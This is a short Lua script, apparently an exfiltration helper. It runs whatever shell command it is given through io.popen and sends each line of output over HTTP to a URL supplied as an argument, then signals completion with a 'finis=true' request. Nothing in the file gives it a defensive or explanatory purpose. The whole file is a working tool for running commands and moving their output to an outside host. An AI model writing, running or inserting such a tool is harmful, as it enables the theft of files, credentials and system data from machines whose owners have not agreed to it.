local url = arg[1]
local cmd = arg[2]
local http = require 'socket.http'
local f = io.popen(cmd)
for line in f:lines() do
    http.request(url,'data='..line)
end
f:close()
http.request(url,'finis=true')

